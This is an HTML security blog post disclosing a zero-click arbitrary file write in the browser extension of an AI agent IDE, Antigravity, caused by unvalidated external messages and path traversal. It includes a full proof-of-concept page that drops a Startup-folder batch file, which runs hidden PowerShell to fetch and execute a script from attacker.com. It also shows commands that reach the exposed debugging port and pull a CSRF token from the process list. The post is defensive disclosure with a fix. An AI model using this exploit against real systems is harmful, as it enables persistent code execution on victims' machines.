<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zero-Click RCE in Google DeepMind's Antigravity</title>
    <meta name="description" content="Any website you visit could silently write files anywhere on your system. A critical vulnerability analysis.">
    <meta name="author" content="Security Research">
    <meta property="og:title" content="Zero-Click RCE in Google DeepMind's Antigravity">
    <meta property="og:description" content="Any website you visit could silently write files anywhere on your system.">
    <meta property="og:type" content="article">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
    <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
    <script>
        mermaid.initialize({
            startOnLoad: true,
            theme: 'dark',
            themeVariables: {
                primaryColor: '#58a6ff',
                primaryTextColor: '#e6edf3',
                primaryBorderColor: '#30363d',
                lineColor: '#8b949e',
                secondaryColor: '#21262d',
                tertiaryColor: '#161b22',
                background: '#0d1117',
                mainBkg: '#161b22',
                nodeBorder: '#30363d',
                clusterBkg: '#21262d',
                titleColor: '#e6edf3',
                edgeLabelBackground: '#161b22'
            },
            flowchart: { curve: 'basis', padding: 20 },
            securityLevel: 'loose'
        });
    </script>
</head>
<body>
    <div class="progress-bar" id="progressBar"></div>

    <nav class="navbar">
        <div class="nav-content">
            <a href="#" class="logo">Security Research</a>
            <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
                <svg class="sun-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <circle cx="12" cy="12" r="5"></circle>
                    <path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"></path>
                </svg>
                <svg class="moon-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                </svg>
            </button>
        </div>
    </nav>

    <article class="article">
        <header class="article-header">
            <div class="article-meta">
                <span class="tag critical">Critical Vulnerability</span>
                <span class="tag">Zero-Click</span>
                <span class="tag">RCE</span>
                <span class="tag">CVSS 9.8</span>
            </div>
            <h1 class="article-title">Zero-Click RCE in Google DeepMind's Antigravity</h1>
            <p class="article-subtitle">Any website you visit could silently write files anywhere on your system.</p>
            <div class="article-info">
                <time datetime="2025-11-27">November 27, 2025</time>
                <span class="separator">|</span>
                <span>30 min read</span>
            </div>
        </header>

        <aside class="toc-container">
            <div class="toc" id="toc">
                <h3>Table of Contents</h3>
                <nav id="tocNav"></nav>
            </div>
        </aside>

        <div class="article-content">
            <section id="introduction">
                <h2>Introduction</h2>
                <p>AI assistants are evolving beyond simple chatbots. The new generation can see your screen, click buttons, fill forms, and interact with your browser in ways that blur the line between software and user.</p>
                <p>Google DeepMind's Antigravity is one such tool. It's an AI browser assistant that doesn't just answer questions—it takes action. And with that power comes an expanded attack surface that most security models haven't caught up with.</p>
                <p>While analyzing Antigravity's browser extension, I discovered a critical vulnerability that allowed any website to write arbitrary files to a user's system. No clicks required. No prompts. No warnings.</p>
                <div class="callout callout-danger">
                    <strong>Impact:</strong> Visiting a malicious webpage could drop an executable into your Windows Startup folder, achieving persistent code execution on next reboot.
                </div>
            </section>

            <section id="architecture">
                <h2>Part 1: Understanding the Full Architecture</h2>
                <p>Google launched Antigravity IDE on November 18, 2025—a fork of VS Code with AI agents built in. The agents can write code, edit files, run terminal commands, and control a browser.</p>

                <h3>The Entry Point: The Agent's Tools</h3>
                <pre><code class="language-plaintext">Tool: browser_subagent
Start a browser subagent to perform actions in the browser with the given task
description. The subagent has access to tools for both interacting with web page
content (clicking, typing, navigating, etc) and controlling the browser window
itself (resizing, etc).

Note: All browser interactions are automatically recorded and saved as WebP
videos to the artifacts directory.</code></pre>

                <h3>Tracing the Process Tree</h3>
                <pre><code class="language-bash">$ ps aux | grep Chrome
/Applications/Google Chrome.app/Contents/MacOS/Google Chrome \
  --remote-debugging-port=9222 \
  --user-data-dir=/Users/user/.gemini/antigravity-browser-profile \
  --disable-fre --no-default-browser-check</code></pre>

                <p>Chrome with <strong>remote debugging enabled on port 9222</strong>. Following the process tree revealed:</p>
                <pre><code class="language-bash">$ ps -ef | grep language_server
/Applications/Antigravity.app/.../language_server_macos_arm \
  --extension_server_port 53410 \
  --api_server_url http://jetski-server.corp.goog \
  --csrf_token [REDACTED]</code></pre>

                <p><strong>"Jetski"</strong>—that was the internal codename.</p>

                <div class="table-wrapper">
                    <table>
                        <thead><tr><th>Port</th><th>Purpose</th></tr></thead>
                        <tbody>
                            <tr><td>53410</td><td>Extension Server (gRPC-Web, CSRF protected)</td></tr>
                            <tr><td>53412-53413</td><td>LSP channels for code intelligence</td></tr>
                            <tr><td>9222</td><td>Chrome DevTools Protocol</td></tr>
                        </tbody>
                    </table>
                </div>

                <h3>The Six-Layer Architecture</h3>
                <div class="diagram-container">
                    <pre class="mermaid">
flowchart TB
    subgraph Layer1["Layer 1: User Interface"]
        IDE["Antigravity IDE"]
        User["User Request"]
    end
    subgraph Layer2["Layer 2: AI Inference"]
        Jetski["Jetski Server"]
        Decision["Gemini Model"]
    end
    subgraph Layer3["Layer 3: Language Server"]
        LS["language_server"]
        LSFeatures["gRPC-Web + CSRF"]
    end
    subgraph Layer4["Layer 4: MCP Server"]
        MCP["browser-tools-mcp"]
    end
    subgraph Layer5["Layer 5: Browser Extension"]
        SW["Service Worker"]
        Vuln["externally_connectable: all_urls"]
    end
    subgraph Layer6["Layer 6: Chrome"]
        Chrome["Chrome + CDP Port 9222"]
    end
    User --> IDE --> Jetski --> Decision --> LS
    LS --> LSFeatures --> MCP --> SW --> Vuln
    SW --> Chrome
    style Vuln fill:#ff6b6b,color:#fff
                    </pre>
                </div>

                <h3>Complete Communication Flow</h3>
                <div class="diagram-container">
                    <pre class="mermaid">
sequenceDiagram
    participant User
    participant IDE as Antigravity IDE
    participant AI as Jetski Server
    participant LS as Language Server
    participant MCP as MCP Server
    participant Ext as Extension
    participant Chrome
    User->>IDE: "Go to google.com"
    IDE->>AI: Inference request
    AI->>IDE: tool_call: browser.open_url
    IDE->>LS: Execute browser.open_url
    LS->>MCP: HTTP command
    MCP->>Ext: navigate request
    Ext->>Chrome: CDP: Target.createTarget
    Chrome-->>Ext: Page loaded
    Ext-->>IDE: Success
    IDE-->>User: "I opened google.com"
                    </pre>
                </div>

                <h3>The Complete Tool Arsenal</h3>
                <div class="tool-grid">
                    <div class="tool-category">
                        <h4>Browser Navigation</h4>
                        <ul><li>browser.open_url</li><li>browser.click_element</li><li>browser.press_key</li><li>browser.input</li></ul>
                    </div>
                    <div class="tool-category">
                        <h4>Browser Capture</h4>
                        <ul><li>browser.get_dom</li><li>browser.capture_screenshot</li><li>browser.execute_javascript</li></ul>
                    </div>
                    <div class="tool-category">
                        <h4>File System</h4>
                        <ul><li>fs.view_file_range</li><li>fs.list_directory</li><li>fs.write_file</li></ul>
                    </div>
                    <div class="tool-category">
                        <h4>Search & Web</h4>
                        <ul><li>search.in_file</li><li>web.search</li><li>http.read_url</li></ul>
                    </div>
                </div>
            </section>

            <section id="red-flag">
                <h2>Part 2: The First Red Flag</h2>
                <pre><code class="language-json">{
  "externally_connectable": {
    "matches": ["&lt;all_urls&gt;"]
  }
}</code></pre>
                <div class="callout callout-warning">
                    This means <strong>every website on the internet</strong> can send messages directly to this extension.
                </div>
            </section>

            <section id="attack-surface">
                <h2>Part 3: Mapping the Attack Surface</h2>
                <div class="diagram-container">
                    <pre class="mermaid">
flowchart TB
    subgraph External["Any Website"]
        Website["evil.com"]
        API["chrome.runtime.sendMessage()"]
    end
    subgraph Extension["Browser Extension"]
        Handler["qh Handler - No validation"]
        Router["Action Router"]
    end
    subgraph Actions["Actions"]
        A1["rpcCall"]
        A2["SaveScreenRecording - CRITICAL"]
        A3["getCurrentTabId"]
    end
    subgraph Backend["Backend"]
        LS["Language Server"]
        FS["File System Write"]
    end
    Website --> API --> Handler --> Router
    Router --> A1
    Router --> A2
    Router --> A3
    A2 --> LS --> FS
    style A2 fill:#ff6b6b,color:#fff
    style Handler fill:#ffa94d,color:#000
                    </pre>
                </div>

                <div class="table-wrapper">
                    <table>
                        <thead><tr><th>Action</th><th>Purpose</th><th>Risk</th></tr></thead>
                        <tbody>
                            <tr><td><code>rpcCall.cancelCascade</code></td><td>Cancel automation</td><td class="risk-low">Low</td></tr>
                            <tr><td><code>getCurrentTabId</code></td><td>Get tab ID</td><td class="risk-low">Low</td></tr>
                            <tr><td><code>CHECK_JETSKI_CONNECTION</code></td><td>Check LS connection</td><td class="risk-medium">Info disclosure</td></tr>
                            <tr><td><code>SaveScreenRecording</code></td><td>Save to disk</td><td class="risk-critical">CRITICAL</td></tr>
                        </tbody>
                    </table>
                </div>
            </section>

            <section id="vulnerability">
                <h2>Part 4: The Vulnerability</h2>
                <p>The <code>SaveScreenRecording</code> handler accepts:</p>
                <ul>
                    <li><code>za</code> — File contents as a byte array</li>
                    <li><code>filename</code> — The name of the file</li>
                    <li><code>L</code> — A path component</li>
                </ul>
                <pre><code class="language-plaintext">C:\Users\{username}\.gemini\antigravity\brain\{L}\{filename}</code></pre>
                <div class="callout callout-danger">
                    <strong>Critical Issue:</strong> The handler never validates who sent the message.
                </div>

                <div class="diagram-container">
                    <pre class="mermaid">
flowchart LR
    subgraph Expected["Expected Flow"]
        E1["Offscreen Doc"] -->|"Internal"| E2["Service Worker"] -->|"Verified"| E3["Disk"]
    end
    subgraph Actual["Actual Flow"]
        A1["Any Website"] -->|"External"| A2["Service Worker"] -->|"No check!"| A3["Disk"]
    end
    style E1 fill:#3fb950,color:#fff
    style A1 fill:#ff6b6b,color:#fff
    style A2 fill:#ffa94d,color:#000
                    </pre>
                </div>

                <pre><code class="language-javascript">case 11:  // SaveScreenRecording
    // Validates message SHAPE, not ORIGIN
    if (!a || typeof a !== "object" ||
        a.action !== "SaveScreenRecording" ||
        typeof a.za !== "object" ||
        typeof a.filename !== "string" ||
        typeof a.L !== "string") {
        break;
    }
    // Build protobuf message
    B = new Qg;
    Rg(B, new Uint8Array(a.za));   // ATTACKER CONTROLLED
    cd(B, 2, a.filename);           // ATTACKER CONTROLLED
    cd(B, 3, a.L);                  // ATTACKER CONTROLLED
    return z(n, dh(B).then(...), 16);</code></pre>
            </section>

            <section id="path-traversal">
                <h2>Part 5: Path Traversal</h2>
                <div class="diagram-container">
                    <pre class="mermaid">
flowchart TB
    subgraph Normal["Intended"]
        N1["Base: brain/"] --> N2["L = 'session123'"] --> N3["Result: brain/session123/recording.webm"]
    end
    subgraph Attack["Exploited"]
        A1["Base: brain/"] --> A2["L = '../../../Desktop'"] --> A3["Result: Desktop/payload.bat"]
    end
    style A2 fill:#ff6b6b,color:#fff
    style A3 fill:#ff6b6b,color:#fff
                    </pre>
                </div>
            </section>

            <section id="code-execution">
                <h2>Part 6: Achieving Code Execution</h2>
                <div class="diagram-container">
                    <pre class="mermaid">
sequenceDiagram
    participant V as Victim
    participant W as evil.com
    participant E as Extension
    participant LS as Language Server
    participant FS as File System
    V->>W: Visits page
    W->>E: sendMessage()
    E->>LS: SaveScreenRecording
    LS->>FS: Write to Startup
    rect rgb(248,81,73,0.3)
        Note over V,FS: Next Login = RCE
    end
                    </pre>
                </div>

                <h3>Proof of Concept</h3>
                <div class="video-container">
                    <div class="video-wrapper">
                        <iframe src="https://drive.google.com/file/d/1WJaPxNqA5vAFWytp9_n2yJNU4CH6YgTs/preview" allowfullscreen></iframe>
                    </div>
                    <div class="video-caption">
                        <span class="video-badge">POC Demo</span>
                        <span>Zero-Click RCE Exploitation in Action</span>
                    </div>
                </div>
                <div class="poc-video">
                    <a href="https://drive.google.com/file/d/1WJaPxNqA5vAFWytp9_n2yJNU4CH6YgTs/view" target="_blank" rel="noopener" class="poc-link">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="24" height="24">
                            <polygon points="5 3 19 12 5 21 5 3"></polygon>
                        </svg>
                        Open in New Tab
                    </a>
                </div>
                <pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Cute Cat Pictures&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;Loading cats...&lt;/h1&gt;
&lt;script&gt;
const payload = `@echo off
powershell -w hidden -ep bypass -c "IEX(curl http://attacker.com/shell.ps1)"`;

chrome.runtime.sendMessage("eeijfnjmjelapkebgockoeaadonbchdd", {
    action: "SaveScreenRecording",
    za: Array.from(new TextEncoder().encode(payload)),
    filename: "WindowsUpdate.bat",
    L: "../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
});
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
            </section>

            <section id="discovery">
                <h2>Part 7: An Interesting Discovery</h2>
                <div class="diagram-container">
                    <pre class="mermaid">
flowchart LR
    subgraph Offscreen["offscreen_binary.js"]
        O1["Sends: K, H"]
    end
    subgraph SW["service_worker_binary.js"]
        S1["Expects: za, L"]
    end
    O1 -->|"Mismatch!"| S1
    style O1 fill:#ffa94d,color:#000
    style S1 fill:#ff6b6b,color:#fff
                    </pre>
                </div>
                <p>The minifier assigned different names in each file! Internal flow may be broken—but attackers just need the service worker's expected names.</p>
            </section>

            <section id="additional-vectors">
                <h2>Part 8: Additional Attack Vectors</h2>
                <h3>CDP Exposure</h3>
                <pre><code class="language-bash">$ curl http://127.0.0.1:9222/json/list
# Returns all debug targets - no auth required!</code></pre>
                <h3>CSRF Token in Command Line</h3>
                <pre><code class="language-bash">$ wmic process where "commandline like '%language_server%'" get commandline
language_server_windows_x64.exe --csrf_token d0e7aead-f94f-4acb-bf36-84ed12a0e1bb</code></pre>
            </section>

            <section id="impact">
                <h2>Part 9: Impact Assessment</h2>
                <div class="cvss-score">
                    <div class="cvss-value">9.8</div>
                    <div class="cvss-label">CRITICAL</div>
                </div>
                <div class="table-wrapper">
                    <table>
                        <thead><tr><th>Metric</th><th>Value</th><th>Score</th></tr></thead>
                        <tbody>
                            <tr><td>Attack Vector</td><td>Network</td><td>AV:N</td></tr>
                            <tr><td>Attack Complexity</td><td>Low</td><td>AC:L</td></tr>
                            <tr><td>Privileges Required</td><td>None</td><td>PR:N</td></tr>
                            <tr><td>User Interaction</td><td>None</td><td>UI:N</td></tr>
                            <tr><td>Scope</td><td>Changed</td><td>S:C</td></tr>
                            <tr><td>CIA Impact</td><td>High/High/High</td><td>C:H/I:H/A:H</td></tr>
                        </tbody>
                    </table>
                </div>
                <div class="scenario-grid">
                    <div class="scenario"><h4>Drive-by Download</h4><p>Email link → Exploit → Malware</p></div>
                    <div class="scenario"><h4>Malvertising</h4><p>Ad iframe → Persistence</p></div>
                    <div class="scenario"><h4>Watering Hole</h4><p>Compromise site → Wait</p></div>
                    <div class="scenario"><h4>Exfiltration</h4><p>Cloud folder → Auto-sync</p></div>
                </div>
            </section>

            <section id="root-causes">
                <h2>Part 10: Root Causes</h2>
                <div class="diagram-container">
                    <pre class="mermaid">
flowchart TB
    RC1["externally_connectable: all_urls"] --> Vuln
    RC2["sender never validated"] --> Vuln
    RC3["No path sanitization"] --> Vuln
    Vuln["Zero-Click RCE"]
    style Vuln fill:#ff6b6b,color:#fff
    style RC1 fill:#ffa94d,color:#000
    style RC2 fill:#ffa94d,color:#000
    style RC3 fill:#ffa94d,color:#000
                    </pre>
                </div>
            </section>

            <section id="fix">
                <h2>Part 11: The Fix</h2>
                <div class="diagram-container">
                    <pre class="mermaid">
flowchart TB
    Check1["sender.url includes offscreen.html?"] -->|Yes| Check2
    Check1 -->|No| Deny
    Check2["sender.id === runtime.id?"] -->|Yes| Check3
    Check2 -->|No| Deny
    Check3["!sender.tab?"] -->|Yes| Allow
    Check3 -->|No| Deny
    Allow["Allow"]
    Deny["Deny"]
    style Allow fill:#3fb950,color:#fff
    style Deny fill:#ff6b6b,color:#fff
                    </pre>
                </div>
                <pre><code class="language-javascript">function isAuthorizedSender(sender) {
  return (
    sender.url?.includes("/static/offscreen.html") &&
    sender.id === chrome.runtime.id &&
    !sender.tab
  );
}

if (!isAuthorizedSender(sender)) {
  return { error: "Unauthorized" };
}</code></pre>
            </section>

            <section id="lessons">
                <h2>Part 12: Lessons Learned</h2>
                <div class="lessons-grid">
                    <div class="lesson-category">
                        <h4>Extension Developers</h4>
                        <ul><li>Validate message senders</li><li>Sanitize all paths</li><li>Audit minifier output</li></ul>
                    </div>
                    <div class="lesson-category">
                        <h4>Security Researchers</h4>
                        <ul><li>AI tools = high-value targets</li><li>Check manifest.json</li><li>Look for CDP exposure</li></ul>
                    </div>
                    <div class="lesson-category">
                        <h4>Users</h4>
                        <ul><li>Review permissions</li><li>Keep extensions updated</li></ul>
                    </div>
                </div>
            </section>

            <section id="bigger-picture">
                <h2>Part 13: The Bigger Picture</h2>
                <blockquote class="key-takeaway">
                    <strong>Always verify who's asking. Always sanitize paths. Always assume external input is malicious.</strong>
                </blockquote>
            </section>

            <section id="timeline">
                <h2>Timeline</h2>
                <div class="timeline">
                    <div class="timeline-item"><span class="timeline-date">Nov 18, 2025</span><span class="timeline-event">Antigravity IDE launched</span></div>
                    <div class="timeline-item"><span class="timeline-date">Nov 19, 2025</span><span class="timeline-event">Reverse engineering started</span></div>
                    <div class="timeline-item"><span class="timeline-date">Nov 25, 2025</span><span class="timeline-event">Vulnerability discovered</span></div>
                    <div class="timeline-item"><span class="timeline-date">Nov 26, 2025</span><span class="timeline-event">Additional vectors documented</span></div>
                    <div class="timeline-item fixed"><span class="timeline-date">v1.11.3</span><span class="timeline-event">Patched</span></div>
                </div>
            </section>

            <section id="conclusion">
                <h2>Conclusion</h2>
                <p>This vulnerability was hiding in plain sight. Each issue alone might seem minor—together, they created a zero-click malware delivery system.</p>
                <div class="vulnerability-summary">
                    <div class="summary-item"><span class="summary-label">Extension ID:</span><code>eeijfnjmjelapkebgockoeaadonbchdd</code></div>
                    <div class="summary-item"><span class="summary-label">Vulnerable:</span><span class="version vulnerable">1.11.2</span></div>
                    <div class="summary-item"><span class="summary-label">Fixed:</span><span class="version fixed">1.11.3</span></div>
                </div>
            </section>

            <section id="references">
                <h2>References</h2>
                <ul class="references-list">
                    <li><a href="https://alokbishoyi.com/blogposts/reverse-engineering-browser-automation.html" target="_blank">Reverse Engineering Antigravity's Browser Automation</a> - Alok Bishoyi</li>
                    <li><a href="https://gist.github.com/avilum/ae9e694e97a2575a19878a879d72ca07" target="_blank">AntiGravity Tools Reverse Engineering</a> - @avilum</li>
                    <li>Chrome DevTools Protocol Documentation</li>
                    <li>Chrome Extension Security Best Practices</li>
                </ul>
            </section>
        </div>
    </article>

    <footer class="footer"><p>Security Research Blog</p></footer>

    <button class="back-to-top" id="backToTop" aria-label="Back to top">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 15l-6-6-6 6"></path></svg>
    </button>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <script src="script.js"></script>
</body>
</html>
